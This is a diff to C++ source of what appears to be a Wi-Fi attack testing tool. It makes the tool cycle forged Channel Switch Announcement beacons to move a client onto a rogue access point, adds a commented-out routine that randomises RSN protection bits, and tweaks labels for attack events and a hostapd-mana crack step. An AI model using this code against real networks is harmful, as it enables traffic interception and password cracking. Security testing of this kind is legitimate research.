@@ -2,6 +2,7 @@
 #include <algorithm>
 #include <cassert>
 #include <chrono>
+#include <random>
 #include <filesystem>
 #include <nlohmann/json.hpp>
 #include <optional>
@@ -67,7 +68,17 @@ static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) 
 			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
 			if(!data.empty()) data[0] = static_cast<uint8_t>(ap_channel.ch_num);
 			o = Dot11::option(Dot11::OptionTypes::HT_OPERATION, data.size(), data.data());
-		} else if(id == Dot11::OptionTypes::VHT_OP) {
+		/*} else if(id == static_cast<uint8_t>(Dot11::OptionTypes::RSN)) {
+			//FIXME EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
+			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
+			if(data.size() >= 20) {
+				static mt19937 rng(random_device{}());
+				// ponytail: randomise MFPC/MFPR bits (debug only)
+				data[18] = (data[18] & ~0xC0u) | (uniform_int_distribution<uint8_t>(0, 3)(rng) << 6);
+			}
+			o = Dot11::option(static_cast<Dot11::OptionTypes>(48), data.size(), data.data());
+		*/
+		}else if(id == Dot11::OptionTypes::VHT_OP) {
 			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
 			if(data.size() >= 3 && data[0] == 1) // 80 MHz: patch center channel
 				data[1] = vht_center_ch(ap_channel.ch_num);
@@ -184,9 +195,14 @@ void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, c
 			ap_channel.ch_num,
 			ssid);
 
-	RadioTap csa_rt = get_CSA_beacon(ap_mac, ap_channel, new_channel, 3, beacon.get());
+	vector<RadioTap> frames;
+	for(int c = 3; c >= 0; --c)
+		frames.push_back(get_CSA_beacon(ap_mac, ap_channel, new_channel, c, beacon.get()));
+
+	size_t idx = 0;
 	while(steady_clock::now() < end_time) {
-		sender.send(csa_rt);
+		sender.send(frames[idx]);
+		if(++idx >= frames.size()) idx = 0;
 		interruptible_sleep(milliseconds(ms_interval));
 	}
 }
@@ -278,9 +294,9 @@ void stats_attack(const RunStatus &rs) {
 	rs.log_events(elements, { { "client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH", "SWITCH", "blue" } });
 
 	pcap_events(rs, elements, {
-		{ "attacker", "wlan.fc.type_subtype == 0x000c && wlan.sa == " + client_mac, "DISCONNECTED (att)", "red" },
+		{ "attacker", "wlan.fc.type_subtype == 0x000c && wlan.sa == " + client_mac, "DISCONNECTED_att", "red" },
 		{ "attacker", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "black" },
-		{ "rogue_ap", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "red" }
+		{ "rogue_ap", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "blue" }
 	});
 	
 	auto [rogue_ap_connected, crack_result] = visual::helper::hostapd_mana_crack(rs, elements);
